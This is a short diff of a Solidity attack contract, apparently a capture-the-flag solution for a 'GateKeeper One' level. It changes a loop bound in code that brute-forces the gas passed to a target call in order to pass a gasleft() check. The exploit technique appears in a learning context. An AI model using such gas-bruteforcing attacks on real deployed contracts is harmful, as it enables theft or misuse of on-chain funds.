@@ -16,7 +16,7 @@ contract MyGateKeeper1Attack is IAttack {
         // gasleft() may change because of compiler version and settings
         // so bruteforce
 
-        for (uint256 i = 100; i <= 900; ++i) {
+        for (uint256 i = 100; i < 901; ++i) {
             (bool success, ) = _target.call{ gas: 8191 * 10 + i }(payload);
             if (success) {
                 break;
